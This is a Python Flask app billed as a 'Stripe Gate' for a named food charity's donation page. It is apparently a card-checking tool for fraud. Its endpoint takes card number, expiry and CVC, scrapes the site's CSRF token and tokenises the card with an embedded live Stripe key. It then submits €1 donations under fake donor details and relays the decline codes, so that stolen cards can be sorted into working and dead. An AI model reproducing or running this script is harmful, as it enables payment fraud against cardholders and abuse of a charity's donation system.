# -------------------------------------------------
# app.py – MannaHelps.org €1 Donation Gate (Updated)
# -------------------------------------------------
import requests, json, re
from urllib.parse import unquote
from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)
session = requests.Session()

# -------------------------------------------------
# 1. CLEAN RESPONSE PARSER
# -------------------------------------------------
def log_final_response(resp):
    try:
        try:
            data = resp.json()
            code = data['error'].get('code', '') if 'error' in data else ''
            msg  = data['error'].get('message', '') if 'error' in data else data
        except json.JSONDecodeError:
            html = resp.text
            html = re.sub(r'[\r\n]+Param\s*is:.*?(?=[\r\n]|<)', '', html, flags=re.I)
            code = re.search(r'Code\s*is:\s*([^<\n]+)', html, re.I)
            msg  = re.search(r'Message\s*is:\s*([^<\n]+)', html, re.I)
            code = code.group(1).strip() if code else ''
            msg  = msg.group(1).strip() if msg else 'Unknown error'

        result = {
            "error_code": code,
            "response": {"code": code, "message": msg}
        }
    except Exception as e:
        result = {"error_code":"parse_error","response":{"code":"parse_error","message":f"Parse error: {e}"}}
    print(json.dumps(result, indent=2))
    return result

# -------------------------------------------------
# 2. GET CSRF TOKEN
# -------------------------------------------------
def get_csrf_token():
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
        'referer': 'https://www.mannahelps.org/donate/food/',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    try:
        r = session.get('https://www.mannahelps.org/donate/money/', headers=headers, timeout=15)
        m = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)
        return m.group(1) if m else None
    except Exception as e:
        print(f"CSRF token error: {e}")
        return None

# -------------------------------------------------
# 3. CHECK IF CARD IS EXPIRED
# -------------------------------------------------
def is_card_expired(mm, yy):
    """Check if the card is expired based on current date"""
    try:
        # Convert year to 4 digits if needed
        if len(yy) == 2:
            yy = '20' + yy
        
        # Get current month and year
        now = datetime.now()
        current_year = now.year
        current_month = now.month
        
        # Convert to integers
        exp_year = int(yy)
        exp_month = int(mm)
        
        # Check if card is expired
        if exp_year < current_year or (exp_year == current_year and exp_month < current_month):
            return True
        return False
    except:
        return False

# -------------------------------------------------
# 4. CREATE STRIPE TOKEN (EUR)
# -------------------------------------------------
def create_stripe_token(cc, mm, yy, cvc):
    if len(yy) == 2: yy = '20' + yy
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
    }
    payload = (
        f'key=pk_live_7EhDaYyXbPLKSk9IhDTiU0Kr'
        f'&payment_user_agent=stripe.js%2F78ef418'
        f'&card[number]={cc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&card[cvc]={cvc}'
        f'&card[name]=Test+User'
        f'&card[address_line1]=123+Main+St'
        f'&card[address_city]=Berlin'
        f'&card[address_state]=BE'
        f'&card[address_zip]=10115'
        f'&card[address_country]=DE'          # required for EUR
    )
    try:
        r = session.post('https://api.stripe.com/v1/tokens', headers=headers, data=payload, timeout=20)
        j = r.json()
        
        # Check for specific error messages from Stripe
        if 'error' in j:
            error_code = j.get('error', {}).get('code', '')
            error_msg = j.get('error', {}).get('message', '')
            
            # Map Stripe errors to our format
            if error_code == 'expired_card':
                return None, {"error_code": "expired_card", "message": "Your card has expired"}
            elif error_code == 'invalid_expiry_year':
                return None, {"error_code": "invalid_expiry_year", "message": "Invalid expiration year"}
            elif error_code == 'invalid_expiry_month':
                return None, {"error_code": "invalid_expiry_month", "message": "Invalid expiration month"}
            else:
                return None, {"error_code": error_code, "message": error_msg}
        
        return j.get('id'), None
    except Exception as e:
        return None, {"error_code": "stripe_error", "message": f"Stripe error: {e}"}

# -------------------------------------------------
# 5. SUBMIT €1 DONATION
# -------------------------------------------------
def submit_donation(stripe_token):
    csrf = get_csrf_token()
    if not csrf:
        return {"error_code":"csrf_failed","response":{"code":"csrf_failed","message":"CSRF missing"}}

    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.mannahelps.org',
        'referer': 'https://www.mannahelps.org/donate/money/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }

    data = [
        ('account', 'Programs/Services'),
        ('amount', 'other'),
        ('amnto-text', '1'),                     # 1 EUR
        ('name', 'Test User'),
        ('email', 'test@example.com'),
        ('comfirmAddress', 'test@example.com'),
        ('phone', '49123456789'),
        ('address_line1', '123 Main St'),
        ('address_city', 'Berlin'),
        ('address_state', 'BE'),
        ('address_zip', '10115'),
        ('formID', 'donate'),
        ('csrf_token', csrf),
        ('id', 'Manna Donation'),
        ('itemInfo', 'One-Time Donation'),
        ('interval', '1'),
        ('amountInput', '1.00'),                 # 1.00 EUR
        ('currency', 'EUR'),                     # <-- SELECT EURO
        ('id', 'Payment'),
        ('utm_source', 'null'), ('utm_medium', 'null'),
        ('utm_campaign', 'null'), ('gclid', 'null'),
        ('stripeToken', stripe_token),
    ]

    try:
        r = session.post('https://www.mannahelps.org/checkout/payment.php',
                         headers=headers, data=data, timeout=30)
        return log_final_response(r)
    except Exception as e:
        return {"error_code":"submit_error","response":{"code":"submit_error","message":str(e)}}

# -------------------------------------------------
# 6. ENDPOINT – €1, NO CC VALIDATION
# -------------------------------------------------
@app.route('/gate=stripe1$/cc=<path:card>', methods=['GET'])
def stripe_gate(card):
    try:
        parts = [p.strip() for p in unquote(card).split('|')]
        if len(parts) != 4:
            return jsonify({"error_code":"invalid_format",
                           "response":{"code":"invalid_format",
                                       "message":"Use: cc|mm|yy|cvc"}}), 400
        cc, mm, yy, cvc = parts

        # ---- ONLY MM / YY / CVC FORMAT ----
        if not mm.isdigit() or not (1 <= int(mm) <= 12):
            return jsonify({"error_code":"invalid_mm",
                           "response":{"code":"invalid_mm","message":"Invalid month"}}), 400
        if not yy.isdigit() or len(yy) not in (2,4):
            return jsonify({"error_code":"invalid_yy",
                           "response":{"code":"invalid_yy","message":"Invalid year"}}), 400
        if not cvc.isdigit():
            return jsonify({"error_code":"invalid_cvc",
                           "response":{"code":"invalid_cvc","message":"CVC must be digits"}}), 400

        # ---- CHECK IF CARD IS EXPIRED ----
        if is_card_expired(mm, yy):
            return jsonify({"error_code":"expired_card",
                           "response":{"code":"expired_card","message":"Your card has expired"}}), 400

        # ---- AMEX CVC RULE ----
        is_amex = cc.startswith('3')
        if is_amex and len(cvc) != 4:
            return jsonify({"error_code":"incorrect_cvc",
                           "response":{"code":"incorrect_cvc",
                                       "message":"Your card's security code is invalid"}}), 400
        if not is_amex and len(cvc) != 3:
            return jsonify({"error_code":"incorrect_cvc",
                           "response":{"code":"incorrect_cvc",
                                       "message":"Your card's security code is invalid"}}), 400

        # ---- CREATE TOKEN & SUBMIT ----
        token, err = create_stripe_token(cc, mm, yy, cvc)
        if not token:
            # Handle different error formats
            if isinstance(err, dict):
                return jsonify({"error_code": err.get("error_code", "token_failed"),
                               "response":{"code": err.get("error_code", "token_failed"),
                                           "message": err.get("message", "Token failed")}}), 400
            else:
                return jsonify({"error_code":"token_failed",
                               "response":{"code":"token_failed",
                                           "message": err or "Token failed"}}), 400

        result = submit_donation(token)
        return jsonify(result), 200

    except Exception as e:
        return jsonify({"error_code":"server_error",
                       "response":{"code":"server_error",
                                   "message":f"Server error: {e}"}}), 500

# -------------------------------------------------
# 7. HOME PAGE
# -------------------------------------------------
@app.route('/')
def home():
    return """
    <h2>Stripe Gate – MannaHelps.org (€1)</h2>
    <p><b>Endpoint:</b> <code>/gate=stripe1$/cc=4242424242424242|12|25|123</code></p>
    <p><b>Format:</b> <code>cc|mm|yy|cvc</code></p>
    <p><b>CVC:</b> Amex (3xxx) → 4 digits | Others → 3 digits</p>
    <p><b>Amount:</b> <strong>€1.00</strong> per request</p>
    <p><b>No card-number validation</b></p>
    """

# -------------------------------------------------
# 8. RUN
# -------------------------------------------------
if __name__ == '__main__':
    print("EUR 1 Gate running → http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
